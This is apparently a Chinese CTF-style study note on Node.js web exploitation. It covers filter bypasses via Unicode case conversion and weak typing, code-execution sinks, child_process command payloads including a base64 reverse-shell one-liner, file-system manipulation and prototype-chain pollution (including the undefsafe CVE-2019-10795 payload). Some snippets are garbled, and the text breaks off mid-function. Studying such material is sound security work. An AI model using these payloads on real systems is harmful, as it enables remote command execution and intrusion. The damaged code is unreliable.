# nodejs全覆盖
### 前言
或许前路永夜，即便如此我也要前进，因为星光即使微弱也会为我照亮前途。————四月是你的谎言
### Nodejs
#### 介绍
简单的说 Node.js 就是运行在服务端的 JavaScript。
Node.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。
Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript
的速度非常快，性能非常好。
#### 应用
  * 第一大类：用户表单收集系统、后台管理系统、实时交互系统、考试系统、联网软件、高并发量的web应用程序
  * 第二大类：基于web、canvas等多人联网游戏
  * 第三大类：基于web的多人实时聊天客户端、聊天室、图文直播
  * 第四大类：单页面浏览器应用程序
  * 第五大类：操作数据库、为前端和移动端提供基于`json`​​的API
### 特性
#### 大小写
toUpperCase() 在JavaScript中 是将小写改为大写的函数
但是就是在转换大小写的过程中 我们可以使用一些我们并不常见的字符 来转换出 我们所需要的字符 来绕过过滤
    "ı".toUpperCase() == 'I'，"ſ".toUpperCase() == 'S'
那么相对应的 toLowerCase() 也会有相关的特性
    "K".toLowerCase() == 'k'
#### 弱类型
与php相似的 数字与数字字符串比较的时候 数字型字符串会被转换之后 再比较
    console.log(1=='1'); //true
    console.log(1>'2'); //false
    console.log('1''3'); //true
    console.log('111'>'3'); //false
    console.log('asd'>1); //false
最后一个字符串 被转换完之后 可能是0 了捏
字符串与字符串相比较 比第一个ASCII码
    console.log([]==[]); //false
    console.log([]>[]); //false
    console.log([6,2]>[5]); //true
    console.log([100,2]{
      console.log("console.log('Hacked')");
    },2000);
    var server = app.listen(1234,function(){
        console.log("应用实例，访问地址为 http://127.0.0.1:1234/");
    })
##### setinterval()
setinterval (function,time)，该函数的作用是每个两秒执行一次代码。
    var express = require("express");
    var app = express();
    setInterval(()=>{
      console.log("console.log('Hacked')");
    },2000);
    var server = app.listen(1234,function(){
        console.log("应用实例，访问地址为 http://127.0.0.1:1234/");
    })
##### function()
function(string)()，string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。
    var express = require("express");
    var app = express();
    var aaa=Function("console.log('Hacked')")();
    var server = app.listen(1234,function(){
        console.log("应用实例，访问地址为 http://127.0.0.1:1234/");
    })
#### process 模块命令执行
##### ​ **exec** ​：
    require('child_process').exec('calc');
##### **execFile**
    require('child_process').execFile("calc",{shell:true});
##### **fork**
    require('child_process').fork("./hacker.js");
##### **spawn**
    require('child_process').spawn("calc",{shell:true});
##### 反弹shell
    require('child_process').exec('echo SHELL_BASE_64|base64 -d|bash');
    注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)
> PS：如果上下文中没有require(类似于Code-Breaking 2018
> Thejs)，则可以使用`global.process.mainModule.constructor._load('child_process').exec('calc')`​​来执行命令
#### 文件操作
那么在上面 我们已经可以执行我们像执行的代码 了 那么对于文件的操作也是很好实现的
操作函数后面有Sync 代表同步方法
nodejs文件系统模块中的方法均有异步和同步版本 比如读取文件内容的函数有 异步的fs.readFile() 和 同步的
fs.readFileSync()。
异步的方法函数 最后一个 参数为 回调函数 回调函数的 第一个参数 包含了错误信息
建议使用异步方法 性能更高 速度更快
增删查改
    res.end(require('fs').readdirSync('.').toString())
    res.end(require('fs').writeFileSync('./daigua.txt','内容').toString());
    res.end(require('fs').readFileSync('./daigua.txt').toString());
    res.end(require('fs').rmdirSync('./daigua').toString());
### 原型链污染 step1
原型链污染就是 我们控制私有属性（ **proto** ）指向的原型对象（prototype）， 将其的属性产生变更 那么所继承她的对象 也会拥有这个属性
#### prototype和 **proto** 分别是甚么
JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：
    function Foo() {
        this.bar = 1
    }
    new Foo()
Foo函数的内容 就是 Foo类的构造函数 而this.bar 就是 Foo类的一个属性
> 为了简化编写JavaScript代码，ECMAScript 6后增加了`class`​​语法，但`class`​​其实只是一个语法糖。
一个类中 必然有一些方法 类似 属性this.bar 我们也可以将方法 定义再构造函数内部
    function Foo() {
        this.bar = 1
        this.show = function() {
            console.log(this.bar)
        }
    }
    (new Foo()).show()
但这样写有一个问题，就是每当我们新建一个Foo对象时，`this.show =
function...`​​就会执行一次，这个`show`​​方法实际上是绑定在对象上的，而不是绑定在“类”中。
我希望 在创建类的时候 只创建一次 show方法 这时候就要使用 prototype了
    function Foo() {
        this.bar = 1
    }
    Foo.prototype.show = function show() {
        console.log(this.bar)
    }
    let foo = new Foo()
    foo.show()
我们可以认为 原型prototype 是类Foo的一个属性 而 所有用Foo类实例化的对象 都将拥有这个属性中的 所有内容 而 所有用Foo类实例化 的对象
都将拥有这个属性的所有内容 包括变量和方法 比如 上面的foo对象 其天生就具有 foo.show() 方法
我们 可以通过 Foo.prototype 来访问Foo类的原型 但是 Foo实例化出来的对象 是不能通过 prototype访问原型的 那么 这个时候
就该`__proto__`​​ 登场了
一个 Foo类实例化出来的foo对象 可以通过 `foo.__proto__`​​ 属性 来访问Foo类的原型
    foo.__proto__ == Foo.prototype
所以，总结一下：
  1. ​`prototype`​​是一个类的属性，所有类对象在实例化的时候将会拥有`prototype`​​中的属性和方法
  2. 一个对象的`__proto__`​​属性，指向这个对象所在的类的`prototype`​​属性
#### JavaScript原型链污染
所有类对象 在实例化的 时候 都会拥有 prototype中的属性 和 方法 这个特性 被用来实现JavaScript 中的继承机制
such as
    function Father() {
        this.first_name = 'Donald'
        this.last_name = 'Trump'
    }
    function Son() {
        this.first_name = 'Melania'
    }
    Son.prototype = new Father()
    let son = new Son()
    console.log(`Name: ${son.first_name} ${son.last_name}`)
Son类 继承了 Father类的last_name 属性 最后输出的 是 `Name: Melania Trump`​
对于对象 son 在调用 son.last_name 的时候 实际上 JavaScript 引擎 会进行如下 操作
  1. 在对象son中寻找 last_name
  2. 找不到 则在son. **proto** 中寻找last_name
  3. 如果 仍然找不到 则继续在son. **proto**. **proto** 中寻找last_name
  4. 依次寻找 直到找到null 结束 比如 Object.prototype 的 **proto** 都是 null
JavaScript的 这个 查找的机制 被应用在面向对象的继承中 被称作 prototype 继承链
综上 需要记住以下几点
  1. 每个构造函数 （constructor）都有一个原型对象（prototype）
  2. 对象的 **proto** 属性 指向类的原型对象 （prototype）
  3. JavaScript使用prototype 链实现继承机制
#### 什么是原型链污染
一个demo
    // foo是一个简单的JavaScript对象
    let foo = {bar: 1}
    // foo.bar 此时为1
    console.log(foo.bar)
    // 修改foo的原型（即Object）
    foo.__proto__.bar = 2
    // 由于查找顺序的原因，foo.bar仍然是1
    console.log(foo.bar)
    // 此时再用Object创建一个空的zoo对象
    let zoo = {}
    // 查看zoo.bar
    console.log(zoo.bar)
这个语句到最后 zoo.bar 的结果 是2 虽然zoo是一个 空对象
而这个的原因也就是 在前面我们修改foo的原型 foo. **proto**.bar =2 而 foo是一个 Object类的实例 所以
实际上是修改了Object这个类 给这个类增加了一个属性bar 值为2
后来 我们又用 Object类 创建了一个 zoo对象 那么 这个zoo对象 自然也有一个bar属性了
那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是 **原型链污染** 。
简单易懂的说 就是 儿子改了 老子也被传染了 然后其所再产生的儿子 也是这个属性了
demo2
    object1 = {"a":1, "b":2};
    object1.__proto__.foo = "Hello World";
    console.log(object1.foo);
    object2 = {"c":1, "d":2};
    console.log(object2.foo);
o1 和 o2 相当于继承了Object.prototype 所以当我们对一个对象设置foo属性 就造成了原型链污染 导致Object2 也拥有了foo属性
#### 那些情况下会有 原型链污染
如果 我们需要利用原型链污染 那我们就需要设置 **`__proto__`** ​​ 的值 也就是需要找到能控制数组的键名的操作 最常见的就是merge
clone copy
merge方法 是合并对象的方法 合并两个对象或者 多个对象的属性
clone方法 就是克隆捏
    function merge(target, source) {
        for (let key in source) {
            if (key in source && key in target) {
                merge(target[key], source[key])
            } else {
                target[key] = source[key]
            }
        }
    }
在合并的过程中 存在赋值的操作 target[key] = source[key] 那么 这个key如果是 **proto** 是不是就可以进行原型链污染
我们用如下代码试一下啊
    let o1 = {}
    let o2 = {a: 1, "__proto__": {b: 2}}
    merge(o1, o2)
    console.log(o1.a, o1.b)
    o3 = {}
    console.log(o3.b)
可以看到 这样写 并没有进行污染 但是 二者合并了
这是因为 我们用JavaScript 创建o2的过程`{a: 1, "__proto__": {b: 2}}`​​ 中 **proto**
已经代表o2的原型了 此时 遍历 o2所有键名 你拿到的是[a,b] **proto** 并不是一个key 自然 也不会修改 Object的原型
那么 我们的任务就变成了 让 **proto** 被认为是一个 键名
    let o1 = {}
    let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
    merge(o1, o2)
    console.log(o1.a, o1.b)
    o3 = {}
    console.log(o3.b)
    最终输出
    1 2
    2
向上面这么写 最后会完成污染 这是因为 json解析的时候 **proto** 会被认为成一个真正的键名 而不代表原型 所以在遍历o2的时候 会存在这个键
但是 我们输出a 为undefined
上面o1 o2 输出a为1 是因为 merge对二者进行了融合 但是并没有进行污染
#### Undefsafe 模块原型链污染（CVE-2019-10795）
    var object = {
        a: {
            b: {
                c: 1,
                d: [1,2,3],
                e: 'whoami'
            }
        }
    };
    console.log(object.a.b.e)
    console.log(object.a.c.e)
可以看到当我们正常访问object属性的时候会有正常的回显，但当我们访问不存在属性时则会得到报错：
undefsafe可以帮我们解决这个问题
她还有一个功能 在对对象赋值时 如果目标属性 存在 其可以帮助我们修改对应属性的值
当属性不存在的时候 我们可以对属性赋值
这个需要下载 undefsafe小于2.0.3的版本
我们可以发现 当我们可以控制undefsafe函数的第2 3 个参数的时候 我们可以污染 object中的值
    var a = require("undefsafe");
    var test = {}
    a(test,'__proto__.toString',function(){ return 'just a evil!'})
    console.log('this is '+test)
我们可以看到 上面成功的进行了原型链污染
因为 在在上面 污染了toString 因为在当前对象中找不到 于是 需要向上溯源
最后在进行this is 和 test拼接的时候 触发了tostring 造成了原型链污染
在2.0.3后的版本 加上了下面的限制
应该是 对于其修改Object中本身的属性 做出了限制 所以 不能进行污染了
##### 审计
###### split()
    function splitStr(str, separator) {
        // Function to split string